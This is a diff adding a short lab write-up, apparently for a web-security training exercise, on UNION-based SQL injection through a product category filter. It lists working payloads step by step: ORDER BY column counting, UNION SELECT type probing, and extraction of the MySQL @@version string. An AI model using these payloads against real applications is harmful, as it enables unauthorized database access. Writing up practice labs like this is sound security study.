@@ -1,0 +1,26 @@
+SQL injection - Product category filter
+
+Goals:
+1- Display the database version string.
+
+Analysis:
+
+Step #1: Determine the number of columns
+' ORDER BY 1-- -> error -> probably the database doesn't accept --
+' ORDER BY 1#  -> 200 response -> displayed on the page
+' ORDER BY 2#  -> 200 response -> displayed on the page
+' ORDER BY 3#  -> error
+The number of columns is 2
+
+note: %23 is the # sing in the url form
+
+Step #2: Determine the data type of the columns
+' UNION SELECT 'a', NULL# -> string data type
+' UNION SELECT NULL, 'a'# -> string data type
+Both columns accept string data type
+
+Step #3: Retrieve the database version string
+' UNION SELECT @@version, NULL#
+8.0.29
+
+Solved
